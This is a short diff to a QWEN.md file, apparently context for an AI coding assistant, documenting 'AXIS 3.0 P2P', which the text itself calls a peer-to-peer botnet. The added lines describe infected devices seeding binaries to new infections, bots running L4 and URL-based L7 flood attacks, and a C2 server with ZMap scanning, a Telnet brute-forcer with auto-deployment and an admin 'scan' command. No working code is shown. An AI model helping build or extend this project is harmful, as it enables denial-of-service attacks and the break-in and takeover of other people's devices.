@@ -1,8 +1,16 @@
-# QWEN.md - AXIS 3.0 P2P Project Context (Torrent Edition)
+# QWEN.md - AXIS 3.0 P2P Project Context
 
 ## Project Overview
 
-**AXIS 3.0 P2P Torrent Edition** is a decentralized peer-to-peer botnet where every bot acts as a **torrent-style seeder**. Unlike traditional botnets with centralized binary distribution, here every infected device downloads ALL binaries from the P2P network and immediately becomes a seeder for new infections.
+**AXIS 3.0 P2P** is a decentralized peer-to-peer botnet with integrated scanning capabilities. Every bot acts as a **torrent-style seeder** and can resolve domains via DNS for L4 attacks.
+
+### Key Features (3.0)
+
+1. **DNS Resolution on Bots**: 7 rotating DNS servers (1.1.1.1, 8.8.8.8, 8.8.4.4, 9.9.9.9, 1.0.0.1, etc.)
+2. **URL-Based L7 Attacks**: Bots parse URLs automatically - protocol, domain, path, port
+3. **Integrated Scanners**: C2 includes ZMap + Telnet bruter with auto-deployment
+4. **Scanner Commands**: `scan <startIP> <endIP> [port]` from admin panel
+5. **C2 Directory**: Renamed from `cnc/` to `C2/`
 
 ### Core Architecture (from `how it should work.txt`)
 
